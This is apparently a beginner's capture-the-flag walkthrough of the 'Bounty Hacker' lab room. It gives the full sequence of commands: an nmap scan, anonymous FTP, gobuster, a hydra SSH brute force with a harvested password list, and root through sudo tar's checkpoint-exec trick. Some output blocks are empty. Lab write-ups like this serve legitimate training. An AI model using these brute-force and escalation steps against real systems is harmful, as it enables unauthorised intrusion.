# Room: Bounty Hacker

You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

## Deply the machine:

No answer needed.

# Recon

First things first... Recon. 

## Find open ports on the machine:

No answer needed. 

### Nmap scan:

The first thing I do is scan the network to get an idea of the ports that are open on the machine.  
NOTE: Normally I also add a -oN tag to save the scan results into a file in my working directory, but I skipped it this time.

`nmap -sT -sC 10.67.182.209`

```

```
Since I can see that FTP is running on port 21, with anonymous access, that is the first place I will start.

Logging into FTP I see two files: locks.txt, and task.txt. Let's go ahead and grab those.

```
root@ip-10-67-109-61:~# ftp 10.67.182.209
Connected to 10.67.182.209.

```

After looking at the files we get some pretty good information. And some answers for the rooms.

#### task.txt

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-*** (Answer to who wrote the task list)
```

The other file, locks.txt, looks like potential passwords. Maybe we can use that for a brute force??

# Enumeration

Now for the fun part. Thinking back to our Nmap scan from before, port 80 was open running an HTML site on it. Maybe that could be of some use? 

Let's spool up gobuster (or any other directrory scanning tool you prefer) and take a look.

## Gobuster

`gobuster dir -u http://10.67.182.209 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

```

Okay so maybe there isn't anything worth looking into here... Let's move on to port 22.

## Hydra

Now for a very fun tool. Hydra. We can use Hydra to bruteforce the password on a certain port that is using a protocol that is the answer for a certain question.

`hydra -l lin -P locks.txt ssh://10.67.182.209`

In the command above, we use the username that we got from the task file and the password list that is locks.txt. Now we attack SSH and see if there is a match.

`[22][ssh] host: 10.67.182.209   login: lin   password: ************** (This is the answer to another question so I had to hide it.)`

It appears we got a match. Let's get logged in!

```
lin@ip-10-67-182-209:~/Desktop$ ls
user.txt
```

And there is the user flag!

# Privilege Escalation

Now we just have to look for the root flag. Let's see what steps we can take to get root.

```
lin@ip-10-67-182-209:/$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-67-182-209:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-67-182-209:
    (root) /bin/tar
```

We can see here that lin can use 'tar' as root. Let's make that work to our advantage. To GTFO bins!!

`tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

According to GTFOBins, running the command above with sudo should allow us to escalate to root. Let's try it! 

```
# whoami
root
```

And there we go! We are root! Now you just have to find the root flag, but that is easy since we are root and the flag is in the root directory.

# Room Completed!

Congrats on completing the room! I hope this write up helped you if you got stuck at all! This was my first write up so I hope it made any sense at all. Thank you for reading.

##### See you, space H4ck3r.
